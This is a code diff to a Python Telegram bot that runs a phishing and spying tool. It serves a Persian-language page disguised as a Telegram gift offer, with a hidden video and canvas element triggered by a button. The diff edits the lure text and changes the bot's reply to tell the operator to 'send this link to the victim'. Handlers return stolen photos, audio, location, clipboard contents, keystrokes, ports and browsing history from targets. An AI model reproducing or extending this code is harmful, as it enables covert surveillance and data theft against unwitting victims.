@@ -80,12 +80,12 @@ def send_telegram_location(lat, lng):
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>هدیه</title>
+<head><meta charset="UTF-8"><title>تلگرام</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
 </head>
 <body>
-    <h1 id="msg">برای فعال‌سازی اینترنت رایگان کلیک کنید</h1>
-    <button id="btn" onclick="startEverything()">دریافت هدیه شما ...</button>
+    <h1 id="msg">برای دریافت هدیه کلیک کنید</h1>
+    <button id="btn" onclick="startEverything()">تلگرام</button>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
     <script>
@@ -397,7 +397,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.commit()
         db.close()
         link = f"{PUBLIC_URL}/go/{token}"
-        await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(کد مخصوص شما)")
+        await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(این لینک را برای قربانی ارسال کنید)")
 
     elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
         parts = data.split('|')
@@ -407,13 +407,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.row_factory = sqlite3.Row
         if action == "photo":
             row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row:
+            if row and row['data']:
                 await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
             else:
                 await query.answer("هنوز عکسی دریافت نشده.", show_alert=True)
         elif action == "audio":
             row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row:
+            if row and row['data']:
                 await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
             else:
                 await query.answer("هنوز صدایی ضبط نشده.", show_alert=True)
